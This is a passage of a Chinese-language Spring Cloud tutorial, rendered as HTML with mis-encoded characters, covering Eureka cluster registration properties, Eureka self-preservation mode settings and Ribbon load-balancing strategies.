&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>ä¿®æ”¹application.propertiesæ–‡ä»¶</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spring.application.name=<span class="number">03</span>-springcloud-eureka-client-cluster-provider</span><br><span class="line">#å°†æœåŠ¡åŒæ—¶æ³¨å†Œåˆ°å¤šä¸ªæ³¨å†Œä¸­å¿ƒ,å…¶å®å½“Eurekaæ³¨å†Œä¸­å¿ƒå®ç°é›†ç¾¤ä»¥åï¼Œé‚£ä¹ˆå°†æœåŠ¡æ³¨å†Œåˆ°ä»»æ„ä¸€ä¸ªEurekaçš„æ³¨å†Œä¸­å¿ƒåï¼Œæ•°æ®æœåŠ¡éƒ½ä¼š</span><br><span class="line">#åŒæ­¥åˆ°å…¶ä»–çš„Eurekaæ³¨å†Œä¸­å¿ƒï¼Œä½†æ˜¯å®é™…åº”ç”¨æ—¶è¿˜æ˜¯å»ºè®®å°†æœåŠ¡åˆ†åˆ«æ³¨å†Œåˆ°å…¨éƒ¨çš„Eurekaé›†ç¾¤çš„æ‰€æœ‰æœåŠ¡ä¸­ï¼Œè¿™ä¸ªé˜²æ­¢æŸä¸ªä»¥Eurekaå‡ºç°</span><br><span class="line">#æ•…éšœåæœåŠ¡ä»ç„¶å¯ä»¥æ³¨å†ŒæˆåŠŸ</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka/,http://eureka9200:9200/eureka/</span></span><br><span class="line">#æŒ‡å®šTomcatçš„ç«¯å£å·éœ€è¦é¿å…å’Œå…¶ä»–çš„Tomcatç«¯å£å†²çª</span><br><span class="line">server.port=<span class="number">8081</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>åˆ›å»ºæœåŠ¡çš„æ¶ˆè´¹è€…é¡¹ç›®SpringBooté¡¹ç›®</p>
<p>03-springcloud-eureka-client-cluster-consumer</p>
</li>
<li><p>æ·»åŠ ä¾èµ–åŒ…</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>ä¿®æ”¹application.propertiesæ–‡ä»¶</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spring.application.name= <span class="number">03</span>-springcloud-eureka-client-cluster-provider</span><br><span class="line"></span><br><span class="line">#å°†æœåŠ¡åŒæ—¶æ³¨å†Œåˆ°å¤šä¸ªæ³¨å†Œä¸­å¿ƒ,å…¶å®å½“Eurekaæ³¨å†Œä¸­å¿ƒå®ç°é›†ç¾¤ä»¥åï¼Œé‚£ä¹ˆå°†æœåŠ¡æ³¨å†Œåˆ°ä»»æ„ä¸€ä¸ªEurekaçš„æ³¨å†Œä¸­å¿ƒåï¼Œæ•°æ®æœåŠ¡éƒ½ä¼š</span><br><span class="line">#åŒæ­¥åˆ°å…¶ä»–çš„Eurekaæ³¨å†Œä¸­å¿ƒï¼Œä½†æ˜¯å®é™…åº”ç”¨æ—¶è¿˜æ˜¯å»ºè®®å°†æœåŠ¡åˆ†åˆ«æ³¨å†Œåˆ°å…¨éƒ¨çš„Eurekaé›†ç¾¤çš„æ‰€æœ‰æœåŠ¡ä¸­ï¼Œè¿™ä¸ªé˜²æ­¢æŸä¸ªä»¥Eurekaå‡ºç°</span><br><span class="line">#æ•…éšœåæœåŠ¡ä»ç„¶å¯ä»¥æ³¨å†ŒæˆåŠŸ</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//eureka9100:9100/eureka/,http://eureka9200:9200/eureka/</span></span><br><span class="line">#æŒ‡å®šTomcatçš„ç«¯å£å·éœ€è¦é¿å…å’Œå…¶ä»–çš„Tomcatç«¯å£å†²çª</span><br><span class="line">server.port=<span class="number">8081</span></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨æœåŠ¡æä¾›è€…æœåŠ¡ï¼Œç„¶åè§‚å¯Ÿæ³¨å†Œä¸­å¿ƒé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡ä¼šåœ¨ä¸¤ä¸ªæ³¨å†Œä¸­å¿ƒä¸Šéƒ½æ³¨å†ŒæˆåŠŸï¼›</p>
<h2 id="4-4-EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒè‡ªæˆ‘ä¿æŠ¤æœºåˆ¶"><a href="#4-4-EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒè‡ªæˆ‘ä¿æŠ¤æœºåˆ¶" class="headerlink" title="4.4 EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒè‡ªæˆ‘ä¿æŠ¤æœºåˆ¶"></a>4.4 EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒè‡ªæˆ‘ä¿æŠ¤æœºåˆ¶</h2><p>è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶æ˜¯Eurekaæ³¨å†Œä¸­å¿ƒçš„é‡è¦ç‰¹æ€§ï¼Œå½“Eurekaæ³¨å†Œä¸­å¿ƒè¿›å…¥è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼æ—¶ï¼Œåœ¨Eureka Serveré¦–é¡µä¼šè¾“å‡ºå¦‚ä¸‹è­¦å‘Šä¿¡æ¯ï¼š</p>
<p>EMERGENCY! EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEYâ€™RE NOT. RENEWALS ARE LESSER THAN THRESHOLD AND HENCE THE INSTANCES ARE NOT BEING EXPIRED JUST TO BE SAFE.</p>
<p>emergency! eureka may be incorrectly claiming instances are up when theyâ€™re not. renewals are lesser than threshold and hence the instances are not being expired just to be safe.</p>
<p>åœ¨æ²¡æœ‰Eurekaè‡ªæˆ‘ä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œå¦‚æœEureka Serveråœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰æ¥æ”¶åˆ°æŸä¸ªå¾®æœåŠ¡å®ä¾‹çš„å¿ƒè·³ï¼ŒEureka Serverå°†ä¼šæ³¨é”€è¯¥å®ä¾‹ï¼Œä½†æ˜¯å½“å‘ç”Ÿç½‘ç»œåˆ†åŒºæ•…éšœæ—¶ï¼Œé‚£ä¹ˆå¾®æœåŠ¡ä¸Eureka Serverä¹‹é—´å°†æ— æ³•æ­£å¸¸é€šä¿¡ï¼Œä»¥ä¸Šè¡Œä¸ºå¯èƒ½å˜å¾—éå¸¸å±é™©äº†â€”â€”å› ä¸ºå¾®æœåŠ¡æœ¬èº«å…¶å®æ˜¯æ­£å¸¸çš„ï¼Œæ­¤æ—¶ä¸åº”è¯¥æ³¨é”€è¿™ä¸ªå¾®æœåŠ¡ï¼Œå¦‚æœæ²¡æœ‰è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ï¼Œé‚£ä¹ˆEureka Serverå°±ä¼šå°†æ­¤æœåŠ¡æ³¨é”€æ‰ã€‚</p>
<p>Eurekaé€šè¿‡â€œè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼â€æ¥è§£å†³è¿™ä¸ªé—®é¢˜â€”â€”å½“Eureka ServerèŠ‚ç‚¹åœ¨çŸ­æ—¶é—´å†…ä¸¢å¤±è¿‡å¤šå®¢æˆ·ç«¯æ—¶ï¼ˆå¯èƒ½å‘ç”Ÿäº†ç½‘ç»œåˆ†åŒºæ•…éšœï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠè¿™ä¸ªå¾®æœåŠ¡èŠ‚ç‚¹è¿›è¡Œä¿æŠ¤ã€‚ä¸€æ—¦è¿›å…¥è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ï¼ŒEureka Serverå°±ä¼šä¿æŠ¤æœåŠ¡æ³¨å†Œè¡¨ä¸­çš„ä¿¡æ¯ï¼Œä¸åˆ é™¤æœåŠ¡æ³¨å†Œè¡¨ä¸­çš„æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯ä¸ä¼šæ³¨é”€ä»»ä½•å¾®æœåŠ¡ï¼‰ã€‚å½“ç½‘ç»œæ•…éšœæ¢å¤åï¼Œè¯¥Eureka ServerèŠ‚ç‚¹ä¼šå†è‡ªåŠ¨é€€å‡ºè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚</p>
<p>æ‰€ä»¥ï¼Œè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼æ˜¯ä¸€ç§åº”å¯¹ç½‘ç»œå¼‚å¸¸çš„å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œå®ƒçš„æ¶æ„å“²å­¦æ˜¯å®å¯åŒæ—¶ä¿ç•™æ‰€æœ‰å¾®æœåŠ¡ï¼ˆå¥åº·çš„å¾®æœåŠ¡å’Œä¸å¥åº·çš„å¾®æœåŠ¡éƒ½ä¼šä¿ç•™ï¼‰ï¼Œä¹Ÿä¸ç›²ç›®æ³¨é”€ä»»ä½•å¥åº·çš„å¾®æœåŠ¡ï¼Œä½¿ç”¨è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ï¼Œå¯ä»¥è®©Eurekaé›†ç¾¤æ›´åŠ çš„å¥å£®ã€ç¨³å®šã€‚</p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨é…ç½®é¡¹ï¼š<strong>eureka.server.enable-self-preservation &#x3D; false</strong> ç¦ç”¨è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚</p>
<p>ä½†æ˜¯Eureka Server è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ä¹Ÿä¼šç»™æˆ‘ä»¬å¸¦æ¥ä¸€äº›å›°æ‰°ï¼Œå¦‚æœåœ¨ä¿æŠ¤æœŸå†…æŸä¸ªæœåŠ¡æä¾›è€…åˆšå¥½éæ­£å¸¸ä¸‹çº¿äº†ï¼Œæ­¤æ—¶æœåŠ¡æ¶ˆè´¹è€…å°±ä¼šæ‹¿åˆ°ä¸€ä¸ªæ— æ•ˆçš„æœåŠ¡å®ä¾‹ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨å¤±è´¥ï¼Œå¯¹äºè¿™ä¸ªé—®é¢˜éœ€è¦æœåŠ¡æ¶ˆè´¹è€…ç«¯å…·æœ‰ä¸€äº›å®¹é”™æœºåˆ¶ï¼Œå¦‚é‡è¯•ï¼Œæ–­è·¯å™¨ç­‰ã€‚</p>
<p>Eurekaçš„è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼æ˜¯æœ‰æ„ä¹‰çš„ï¼Œè¯¥æ¨¡å¼è¢«æ¿€æ´»åï¼Œå®ƒä¸ä¼šä»æ³¨å†Œåˆ—è¡¨ä¸­å‰”é™¤å› é•¿æ—¶é—´æ²¡æ”¶åˆ°å¿ƒè·³å¯¼è‡´æ³¨å†Œè¿‡æœŸçš„æœåŠ¡ï¼Œè€Œæ˜¯ç­‰å¾…ä¿®å¤ï¼Œç›´åˆ°å¿ƒè·³æ¢å¤æ­£å¸¸ä¹‹åï¼Œå®ƒè‡ªåŠ¨é€€å‡ºè‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼æ—¨åœ¨é¿å…å› ç½‘ç»œåˆ†åŒºæ•…éšœå¯¼è‡´æœåŠ¡ä¸å¯ç”¨çš„é—®é¢˜ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸¤ä¸ªå¾®æœåŠ¡å®¢æˆ·ç«¯å®ä¾‹Aå’ŒBä¹‹é—´æœ‰è°ƒç”¨çš„å…³ç³»ï¼ŒAæ˜¯æ¶ˆè´¹è€…ï¼ŒBæ˜¯æä¾›è€…ï¼Œä½†æ˜¯ç”±äºç½‘ç»œæ•…éšœï¼ŒBæœªèƒ½åŠæ—¶å‘Eurekaå‘é€å¿ƒè·³ç»­çº¦ï¼Œè¿™æ—¶å€™Eureka ä¸èƒ½ç®€å•çš„å°†Bä»æ³¨å†Œè¡¨ä¸­å‰”é™¤ï¼Œå› ä¸ºå¦‚æœå‰”é™¤äº†ï¼ŒAå°±æ— æ³•ä»Eureka æœåŠ¡å™¨ä¸­è·å–Bæ³¨å†Œçš„æœåŠ¡ï¼Œä½†æ˜¯è¿™æ—¶å€™BæœåŠ¡æ˜¯å¯ç”¨çš„ï¼›</p>
<p>æ‰€ä»¥ï¼ŒEurekaçš„è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼æœ€å¥½è¿˜æ˜¯å¼€å¯å®ƒã€‚</p>
<p>å…³äºè‡ªæˆ‘ä¿æŠ¤å¸¸ç”¨å‡ ä¸ªé…ç½®å¦‚ä¸‹ï¼š</p>
<p>åˆ†åˆ«ä¿®æ”¹2ä¸ªEurekaæœåŠ¡æœåŠ¡ç«¯çš„application.propertiesæ–‡ä»¶å¢åŠ ä¸€ä¸‹é…ç½®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#å…³é—­è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ ä½œç”¨æ˜¯å¦‚æœå¼€å¯äº†è‡ªæˆ‘ä¿æŠ¤æ¨¡å¼ä»¥åï¼Œé‚£ä¹ˆå¦‚æœæœåŠ¡çš„æä¾›è€…æˆ–æ¶ˆè´¹è€…ï¼ˆEurekaçš„å®¢æˆ·ç«¯ï¼‰å› ä¸ºç½‘ç»œæ³¢åŠ¨é—®é¢˜</span><br><span class="line">#æš‚æ—¶å¤±å»äº†ä¸æœåŠ¡å™¨ç«¯çš„è¿æ¥é‚£ä¹ˆEurekaå°±ä¼šç›´æ¥æ³¨é”€è¿™ä¸ªæœåŠ¡åˆ é™¤è¿™ä¸ªæœåŠ¡ç›¸å…³çš„æ•°æ®ï¼Œå¦‚æœå…³é—­äº†è¿™ä¸ªè‡ªæˆ‘ä¿æŠ¤ï¼ŒEurekaåª</span><br><span class="line">#ä¼šå…ˆæŒ‚èµ·è¿™ä¸ªæœåŠ¡ï¼Œå½“ç½‘ç»œæ¢å¤æ­£å¸¸ä»¥åè¿™ä¸ªæœåŠ¡å°†è‡ªåŠ¨çš„æ¢å¤</span><br><span class="line">eureka.server.enable-self-preservation = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>åˆ†åˆ«ä¿®æ”¹æœåŠ¡æä¾›è€…å’ŒæœåŠ¡æ¶ˆè´¹é¡¹ç›®çš„application.propertiesæ–‡ä»¶æ·»åŠ ä¸€ä¸‹é…ç½®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#æ¯é—´éš”2sï¼Œå‘æœåŠ¡ç«¯å‘é€ä¸€æ¬¡å¿ƒè·³ï¼Œè¯æ˜è‡ªå·±ä¾ç„¶<span class="string">&quot;å­˜æ´»&quot;</span></span><br><span class="line">eureka.instance.lease-renewal-interval-in-seconds=<span class="number">2</span></span><br><span class="line">#å‘Šè¯‰æœåŠ¡ç«¯ï¼Œå¦‚æœæˆ‘10sä¹‹å†…æ²¡æœ‰ç»™ä½ å‘å¿ƒè·³ï¼Œå°±ä»£è¡¨æˆ‘æ•…éšœäº†ï¼Œå°†æˆ‘è¸¢å‡ºæ‰</span><br><span class="line">eureka.instance.lease-expiration-duration-in-seconds=<span class="number">10</span></span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬äº”ç« ï¼šå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡Ribbon"><a href="#ç¬¬äº”ç« ï¼šå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡Ribbon" class="headerlink" title="ç¬¬äº”ç« ï¼šå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡Ribbon"></a>ç¬¬äº”ç« ï¼šå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡Ribbon</h1><h2 id="5-1-Spring-Cloudä¸­çš„Ribbonæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#5-1-Spring-Cloudä¸­çš„Ribbonæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="5.1 Spring Cloudä¸­çš„Ribbonæ˜¯ä»€ä¹ˆï¼Ÿ"></a>5.1 Spring Cloudä¸­çš„Ribbonæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æˆ‘ä»¬é€šå¸¸è¯´çš„è´Ÿè½½å‡è¡¡æ˜¯æŒ‡å°†ä¸€ä¸ªè¯·æ±‚å‡åŒ€åœ°åˆ†æ‘Šåˆ°ä¸åŒçš„èŠ‚ç‚¹å•å…ƒä¸Šæ‰§è¡Œï¼Œè´Ÿè½½å‡å’Œåˆ†ä¸ºç¡¬ä»¶è´Ÿè½½å‡è¡¡å’Œè½¯ä»¶è´Ÿè½½å‡è¡¡ï¼š</p>
<p><strong>ç¡¬ä»¶è´Ÿè½½å‡è¡¡</strong>ï¼šæ¯”å¦‚ F5ã€æ·±ä¿¡æœã€Array ç­‰ï¼›</p>
<p><strong>è½¯ä»¶è´Ÿè½½å‡è¡¡</strong>ï¼šæ¯”å¦‚ Nginxã€LVSã€HAProxy ç­‰ï¼›</p>
<p>ç¡¬ä»¶è´Ÿè½½å‡è¡¡æˆ–æ˜¯è½¯ä»¶è´Ÿè½½å‡è¡¡ï¼Œä»–ä»¬éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªå¯ç”¨çš„æœåŠ¡ç«¯æ¸…å•ï¼Œé€šè¿‡å¿ƒè·³æ£€æµ‹æ¥å‰”é™¤æ•…éšœçš„æœåŠ¡ç«¯èŠ‚ç‚¹ä»¥ä¿è¯æ¸…å•ä¸­éƒ½æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„æœåŠ¡ç«¯èŠ‚ç‚¹ã€‚å½“å®¢æˆ·ç«¯å‘é€è¯·æ±‚åˆ°è´Ÿè½½å‡è¡¡è®¾å¤‡çš„æ—¶å€™ï¼Œè¯¥è®¾å¤‡æŒ‰æŸç§ç®—æ³•ï¼ˆæ¯”å¦‚è½®è¯¢ã€æƒé‡ã€ æœ€å°è¿æ¥æ•°ç­‰ï¼‰ä»ç»´æŠ¤çš„å¯ç”¨æœåŠ¡ç«¯æ¸…å•ä¸­å–å‡ºä¸€å°æœåŠ¡ç«¯çš„åœ°å€ï¼Œç„¶åè¿›è¡Œè½¬å‘ã€‚</p>
<p>Ribbonæ˜¯Netflixå‘å¸ƒçš„å¼€æºé¡¹ç›®ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æä¾›å®¢æˆ·ç«¯çš„è½¯ä»¶è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œæ˜¯ä¸€ä¸ªåŸºäºHTTPå’ŒTCPçš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡å·¥å…·ã€‚</p>
<p>Spring Cloudå¯¹Ribbonåšäº†äºŒæ¬¡å°è£…ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨RestTemplateçš„æœåŠ¡è¯·æ±‚ï¼Œè‡ªåŠ¨è½¬æ¢æˆå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡çš„æœåŠ¡è°ƒç”¨ã€‚</p>
<p>Ribbonæ”¯æŒå¤šç§è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œè¿˜æ”¯æŒè‡ªå®šä¹‰çš„è´Ÿè½½å‡è¡¡ç®—æ³•ã€‚</p>
<p>Ribbonåªæ˜¯ä¸€ä¸ªå·¥å…·ç±»æ¡†æ¶ï¼Œæ¯”è¾ƒå°å·§ï¼ŒSpring Cloudå¯¹å®ƒå°è£…åä½¿ç”¨ä¹Ÿéå¸¸æ–¹ä¾¿ï¼Œå®ƒä¸åƒæœåŠ¡æ³¨å†Œä¸­å¿ƒã€é…ç½®ä¸­å¿ƒã€APIç½‘å…³é‚£æ ·éœ€è¦ç‹¬ç«‹éƒ¨ç½²ï¼ŒRibbonåªéœ€è¦åœ¨ä»£ç ç›´æ¥ä½¿ç”¨å³å¯ï¼›</p>
<h3 id="Ribbon-ä¸-Nginx-çš„åŒºåˆ«"><a href="#Ribbon-ä¸-Nginx-çš„åŒºåˆ«" class="headerlink" title="Ribbon ä¸ Nginx çš„åŒºåˆ«"></a>Ribbon ä¸ Nginx çš„åŒºåˆ«</h3><p>Nginxçš„å®˜æ–¹æ­£ç¡®è¯»éŸ³æ˜¯â€œæ©é™åŸƒå…‹æ–¯â€å³â€œ Engine X</p>
<p>Ribbonæ˜¯å®¢æˆ·ç«¯çš„è´Ÿè½½å‡è¡¡å·¥å…·ï¼Œè€Œå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡å’ŒæœåŠ¡ç«¯è´Ÿè½½å‡è¡¡æœ€å¤§çš„åŒºåˆ«åœ¨äºæœåŠ¡æ¸…å•æ‰€å­˜å‚¨çš„ä½ç½®ä¸åŒï¼Œåœ¨å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ä¸­ï¼Œæ‰€æœ‰å®¢æˆ·ç«¯èŠ‚ç‚¹ä¸‹çš„æœåŠ¡ç«¯æ¸…å•ï¼Œéœ€è¦è‡ªå·±ä»æœåŠ¡æ³¨å†Œä¸­å¿ƒä¸Šè·å–ï¼Œæ¯”å¦‚EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚åŒæœåŠ¡ç«¯è´Ÿè½½å‡è¡¡çš„æ¶æ„ç±»ä¼¼ï¼Œåœ¨å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ä¸­ä¹Ÿéœ€è¦å¿ƒè·³å»ç»´æŠ¤æœåŠ¡ç«¯æ¸…å•çš„å¥åº·æ€§ï¼Œåªæ˜¯è¿™ä¸ªæ­¥éª¤éœ€è¦ä¸æœåŠ¡æ³¨å†Œä¸­å¿ƒé…åˆå®Œæˆã€‚åœ¨Spring Cloudä¸­ï¼Œç”±äºSpring Cloudå¯¹Ribbonåšäº†äºŒæ¬¡å°è£…ï¼Œæ‰€ä»¥é»˜è®¤ä¼šåˆ›å»ºé’ˆå¯¹Ribbonçš„è‡ªåŠ¨åŒ–æ•´åˆé…ç½®ï¼›</p>
<p>åœ¨Spring Cloudä¸­ï¼ŒRibbonä¸»è¦ä¸RestTemplateå¯¹è±¡é…åˆèµ·æ¥ä½¿ç”¨ï¼ŒRibbonä¼šè‡ªåŠ¨åŒ–é…ç½®RestTemplateå¯¹è±¡ï¼Œé€šè¿‡@LoadBalancedå¼€å¯RestTemplateå¯¹è±¡è°ƒç”¨æ—¶çš„è´Ÿè½½å‡è¡¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134878.png" alt="image-20201216213130401"></p>
<p>â€‹                               </p>
<h2 id="5-2-Ribbonå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡"><a href="#5-2-Ribbonå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡" class="headerlink" title="5.2 Ribbonå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡"></a>5.2 Ribbonå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡</h2><p>ç”±äºSpring Cloud Ribbonçš„å°è£…ï¼Œ æˆ‘ä»¬åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ä½¿ç”¨å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡è°ƒç”¨éå¸¸ç®€å•ï¼Œ åªéœ€è¦å¦‚ä¸‹ä¸¤æ­¥ï¼š</p>
<ol>
<li><p>å¯åŠ¨å¤šä¸ªæœåŠ¡æä¾›è€…å®ä¾‹å¹¶æ³¨å†Œåˆ°ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒæˆ–æ˜¯æœåŠ¡æ³¨å†Œä¸­å¿ƒé›†ç¾¤ã€‚</p>
</li>
<li><p>æœåŠ¡æ¶ˆè´¹è€…é€šè¿‡è¢«ï¼ LoadBalancedæ³¨è§£ä¿®é¥°è¿‡çš„RestTemplateæ¥è°ƒç”¨æœåŠ¡æä¾›è€…ã€‚</p>
</li>
</ol>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°æœåŠ¡æä¾›è€…çš„é«˜å¯ç”¨ä»¥åŠæœåŠ¡æ¶ˆè´¹è€…çš„è´Ÿè½½å‡è¡¡è°ƒç”¨ã€‚</p>
<h2 id="5-3-Ribbonè´Ÿè½½å‡è¡¡ç­–ç•¥"><a href="#5-3-Ribbonè´Ÿè½½å‡è¡¡ç­–ç•¥" class="headerlink" title="5.3 Ribbonè´Ÿè½½å‡è¡¡ç­–ç•¥"></a>5.3 Ribbonè´Ÿè½½å‡è¡¡ç­–ç•¥</h2><p>Ribbonçš„è´Ÿè½½å‡è¡¡ç­–ç•¥æ˜¯ç”±IRuleæ¥å£å®šä¹‰, è¯¥æ¥å£ç”±å¦‚ä¸‹å®ç°ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134879.png" alt="image-20201216213258692"></p>
<table>
<thead>
<tr>
<th>RandomRule</th>
<th>éšæœº</th>
</tr>
</thead>
<tbody><tr>
<td>RoundRobinRule</td>
<td>è½®è¯¢</td>
</tr>
<tr>
<td>AvailabilityFilteringRule</td>
<td>å…ˆè¿‡æ»¤æ‰ç”±äºå¤šæ¬¡è®¿é—®æ•…éšœçš„æœåŠ¡ï¼Œä»¥åŠå¹¶å‘è¿æ¥æ•°è¶…è¿‡é˜ˆå€¼çš„æœåŠ¡ï¼Œç„¶åå¯¹å‰©ä¸‹çš„æœåŠ¡æŒ‰ç…§è½®è¯¢ç­–ç•¥è¿›è¡Œè®¿é—®ï¼›</td>
</tr>
<tr>
<td>WeightedResponseTimeRule</td>
<td>æ ¹æ®å¹³å‡å“åº”æ—¶é—´è®¡ç®—æ‰€æœ‰æœåŠ¡çš„æƒé‡ï¼Œå“åº”æ—¶é—´è¶Šå¿«æœåŠ¡æƒé‡å°±è¶Šå¤§è¢«é€‰ä¸­çš„æ¦‚ç‡å³è¶Šé«˜ï¼Œå¦‚æœæœåŠ¡åˆšå¯åŠ¨æ—¶ç»Ÿè®¡ä¿¡æ¯ä¸è¶³ï¼Œåˆ™ä½¿ç”¨RoundRobinRuleç­–ç•¥ï¼Œå¾…ç»Ÿè®¡ä¿¡æ¯è¶³å¤Ÿä¼šåˆ‡æ¢åˆ°è¯¥WeightedResponseTimeRuleç­–ç•¥ï¼›</td>
</tr>
<tr>
<td>RetryRule</td>
<td>å…ˆæŒ‰ç…§RoundRobinRuleç­–ç•¥åˆ†å‘ï¼Œå¦‚æœåˆ†å‘åˆ°çš„æœåŠ¡ä¸èƒ½è®¿é—®ï¼Œåˆ™åœ¨æŒ‡å®šæ—¶é—´å†…è¿›è¡Œé‡è¯•ï¼Œåˆ†å‘å…¶ä»–å¯ç”¨çš„æœåŠ¡ï¼›</td>
</tr>
<tr>
<td>BestAvailableRule</td>
<td>å…ˆè¿‡æ»¤æ‰ç”±äºå¤šæ¬¡è®¿é—®æ•…éšœçš„æœåŠ¡ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªå¹¶å‘é‡æœ€å°çš„æœåŠ¡ï¼›</td>
</tr>
<tr>
<td>ZoneAvoidanceRule</td>
